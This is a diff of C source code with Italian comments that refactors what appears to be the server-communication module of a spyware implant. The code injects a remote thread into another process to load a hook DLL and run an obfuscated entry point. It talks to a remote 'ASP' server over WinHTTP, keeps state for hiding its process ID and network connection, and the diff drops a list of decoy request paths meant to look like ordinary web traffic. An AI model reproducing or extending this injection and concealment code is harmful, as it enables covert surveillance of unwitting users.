@@ -20,8 +20,8 @@
 
 #define WIRESPEED (100*1024*1024/8)
 
-HINTERNET asp_global_request = 0; // Handle usato dalle winhttp per inviare/ricevere dati
-BYTE asp_global_session_key[16];
+static HINTERNET asp_global_request = 0; // Handle usato dalle winhttp per inviare/ricevere dati
+static BYTE asp_global_session_key[16];
 
 // --- Altri prototipi usati dal thread ASP ---
 typedef void (WINAPI *ASP_MainLoop_t) (char *);
@@ -35,8 +35,8 @@ typedef struct {
 	char cASPServer[HOSTNAMELEN];   // server ASP
 	char cASPMainLoop[64];          // Nome della funzione ASP
 	ExitProcess_T pExitProcess;
-} ASPThreadDataStruct;
-ASPThreadDataStruct ASPThreadData;
+} ASP_THREAD;
+ASP_THREAD asp_thread;
 
 // Struttura per il passaggio dei comandi ASP in shared memory
 #define ASP_SETUP 0   // Setup (primo comando da inviare) 
@@ -73,49 +73,23 @@ typedef struct {
 	DWORD out_param_len;
 } ASP_IPC_CTRL;
 
-/*#define REQUEST_ARRAY_LEN 19
-WCHAR *wRequest_array[] = {
-		L"/pagead/show_ads.js",
-		L"/licenses/by-nc-nd/2.5",
-		L"/css-validator",
-		L"/stats.asp?site=actual",
-		L"/static/js/common/jquery.js",
-		L"/cgi-bin/m?ci=ads&amp;cg=0",
-		L"/rss/homepage.xml",
-		L"/index.shtml?refresh",
-		L"/static/css/common.css",
-		L"/flash/swflash.cab#version=8,0,0,0",
-		L"/js/swfobjectLivePlayer.js?v=10-57-13",
-		L"/css/library/global.css",
-		L"/rss/news.rss",
-		L"/comments/new.js",
-		L"/feed/view?id=1&type=channel",
-		L"/ajax/MessageComposerEndpoint.php?__a=1",
-		L"/safebrowsing/downloads?client=navclient",
-		L"/extern_js/f/TgJFbiseMTg4LCsw2jgAQIACWFACU6rCA7RidA/qFso89FTd1c.js",
-		L"/search.php"
-	};*/
-
-
 #define REQUEST_ARRAY_LEN 1
-WCHAR *wRequest_array[] = {
+static WCHAR *wRequest_array[] = {
 		L"/index.jsp"
 	};
 
-HANDLE ASP_HostProcess = NULL; // Processo che gestisce ASP
-ASP_IPC_CTRL *ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
-HANDLE hASPIPCcommandfile = NULL;                  // File handle della shared memory dei comandi
-CONNECTION_HIDE connection_hide = NULL_CONNETCION_HIDE_STRUCT; // struttura per memorizzare il pid da nascondere
-PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT; // struttura per memorizzare la connessione da nascondere
-HINTERNET hRequest = 0; // Handle usato dalle winhttp per inviare/ricevere dati
-DWORD pub_key_size = 0; // Dimensione della chiave pubblica nel certificato server
+static HANDLE ASP_HostProcess = NULL; // Processo che gestisce ASP
+static ASP_IPC_CTRL *ASP_IPC_command = NULL;  // Area di shared memory per dare comandi al processo ASP
+static HANDLE hASPIPCcommandfile = NULL;                  // File handle della shared memory dei comandi
+static CONNECTION_HIDE connection_hide = NULL_CONNETCION_HIDE_STRUCT; // struttura per memorizzare il pid da nascondere
+static PID_HIDE pid_hide = NULL_PID_HIDE_STRUCT; // struttura per memorizzare la connessione da nascondere
 
 ///////////////////////////////////////////
 // Funzioni per lanciare il thread ASP   //
 ///////////////////////////////////////////
 
 // Thread remoto iniettato nel processo ASP host
-DWORD ASP_HostThread(ASPThreadDataStruct *pDataThread)
+DWORD ASP_HostThread(ASP_THREAD *pDataThread)
 {
 	HMODULE hASPDLL;
 	ASP_MainLoop_t pASP_MainLoop;
@@ -147,12 +121,12 @@ BOOL ASP_StartASPThread(DWORD dwPid)
 		return FALSE;
 
 	// Alloca dati e funzioni del thread ASP nel processo dwPid
-	if(HM_sCreateHookA(dwPid, NULL, NULL, (BYTE *)ASP_HostThread, 600, (BYTE *)&ASPThreadData, sizeof(ASPThreadData)) == NULL)
+	if(HM_sCreateHookA(dwPid, NULL, NULL, (BYTE *)ASP_HostThread, 600, (BYTE *)&asp_thread, sizeof(asp_thread)) == NULL)
 		return FALSE;
 	
 	if ( !(hThreadRem = HM_SafeCreateRemoteThread(ASP_HostProcess, NULL, 8192, 
-	  									   (LPTHREAD_START_ROUTINE)ASPThreadData.pCommon.dwHookAdd, 
-									       (LPVOID)ASPThreadData.pCommon.dwDataAdd, 0, &dwThreadId)) )
+	  									   (LPTHREAD_START_ROUTINE)asp_thread.pCommon.dwHookAdd, 
+									       (LPVOID)asp_thread.pCommon.dwDataAdd, 0, &dwThreadId)) )
 		return FALSE;
 		
 	// Non e' necessario avere un handle aperto sul
@@ -171,13 +145,13 @@ DWORD ASP_Setup(char *asp_server)
 	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"));
 
 	// API utilizzate dal thread remoto.... [KERNEL32.DLL]
-	VALIDPTR(ASPThreadData.pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"));
-	VALIDPTR(ASPThreadData.pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"));
-	VALIDPTR(ASPThreadData.pExitProcess = (ExitProcess_T) HM_SafeGetProcAddress(hMod, "ExitProcess"));
+	VALIDPTR(asp_thread.pCommon._LoadLibrary = (LoadLibrary_T) HM_SafeGetProcAddress(hMod, "LoadLibraryA"));
+	VALIDPTR(asp_thread.pCommon._GetProcAddress = (GetProcAddress_T) HM_SafeGetProcAddress(hMod, "GetProcAddress"));
+	VALIDPTR(asp_thread.pExitProcess = (ExitProcess_T) HM_SafeGetProcAddress(hMod, "ExitProcess"));
 
-	HM_CompletePath(shared.H4DLLNAME, ASPThreadData.cDLLHookName);
-	_snprintf_s(ASPThreadData.cASPServer, sizeof(ASPThreadData.cASPServer), _TRUNCATE, "%s", asp_server);
-	_snprintf_s(ASPThreadData.cASPMainLoop, sizeof(ASPThreadData.cASPMainLoop), _TRUNCATE, "PPPFTBBP07");
+	HM_CompletePath(shared.H4DLLNAME, asp_thread.cDLLHookName);
+	_snprintf_s(asp_thread.cASPServer, sizeof(asp_thread.cASPServer), _TRUNCATE, "%s", asp_server);
+	_snprintf_s(asp_thread.cASPMainLoop, sizeof(asp_thread.cASPMainLoop), _TRUNCATE, "PPPFTBBP07");
 
 	return 0;
 }
